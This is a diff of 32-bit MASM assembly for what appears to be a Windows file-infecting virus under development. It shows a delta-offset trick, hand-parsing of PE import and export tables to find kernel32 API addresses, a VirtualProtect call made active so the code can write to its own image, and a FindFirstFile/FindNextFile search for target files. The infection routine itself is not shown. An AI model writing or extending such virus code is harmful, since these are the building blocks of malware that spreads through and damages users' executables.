@@ -4,12 +4,12 @@ option casemap:none
 
    include windows.inc
    include user32.inc
-  ; include kernel32.inc
+   include kernel32.inc
    include masm32.inc
    include masm32rt.inc
    
    includelib user32.lib
-  ; includelib kernel32.lib
+   includelib kernel32.lib
    includelib masm32.lib
    
 .data
@@ -40,16 +40,15 @@ delta:
 	pop ebp
 	mov eax,ebp
 	sub ebp,delta
-	mov [ebp+delta_var],ebp
-	invoke MessageBox,NULL, addr FindFirstFileSuccess, addr FolderFound,MB_OK
 	call save_imagebase
 save_imagebase:
 	pop eax
 	;and eax,0xFFF00000		            ; ...00000
 	mov [ebp+image_base],eax			; save image base
-	
 scan_import:
+	xor eax,eax
 	mov esi,[image_base+ebp]			; point on image base
+	mov eax,esi
 	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
 	mov eax,[eax]					; get the value (PE header value)
 	add eax,esi						; +image_base (point to PE header)
@@ -58,9 +57,12 @@ scan_import:
 	add eax,esi						; now point to import table (+ image_base)
 	add eax,12						; +CH (point to .dll)   
 	
+	;mov eax,[image_base+ebp+3ch]
+	;add eax,128
+	;mov eax,[image_base+]
 find_kernel32:
 	xor ebx,ebx						; reset ebx
-	cmp dword ptr [eax],ebx				; cmp if value tai eax=0
+	cmp dword ptr[eax],ebx				; cmp if value tai eax=0
 	je end_objecttable				; if= jmp to end_objectable
 	call is_it_kernel32				; else check if it is kernel32
 	cmp ecx,3						; check if return value=3
@@ -95,6 +97,7 @@ find_MZ_in_kernel:
 	mov esi,edi						; esi=image base of kernel32.dll 
 	add esi,3CH						; mov to header relocation
 	mov esi,[esi]					; get value
+	
 	add esi,edi						; +image base => PE header
 	
 	add esi,120						; move to export table
@@ -120,11 +123,11 @@ find_API:
 	
 	call GetAPIAddress						      ; now get api address 
 	
-	;push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
-	;push dword 0x80							      ; writeable
-	;push dword 0x1000
-	;push dword ptr[ebp+image_base]
-	;call [ebp+VirtualProtectAddress]
+	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
+	push 80h							      	; writeable
+	push 1000h									; 1000 bytes
+	push dword ptr[ebp+image_base]
+	call [ebp+VirtualProtectAddress]
 find_first_file:
 	push dword ptr [ebp+Win32Data]
 	push dword ptr [ebp+search_mask]
@@ -136,7 +139,7 @@ find_next_file:
 	je done_find
 done_find:
 	ret
-	
+	invoke ExitProcess,00
 GetAPIAddress:
 	push dword ptr[ebp+FindFirstFileAStr]
 	push dword ptr[ebp+handle]                  ; module handle
@@ -270,10 +273,8 @@ search_module_3:
 search_module_4:
 	mov ebp,[ebp]
 	add ebp,edi
-	ret
-erreur:	
+	ret	
 	
-
 end_objecttable:
 
 image_base    				dd    0h 
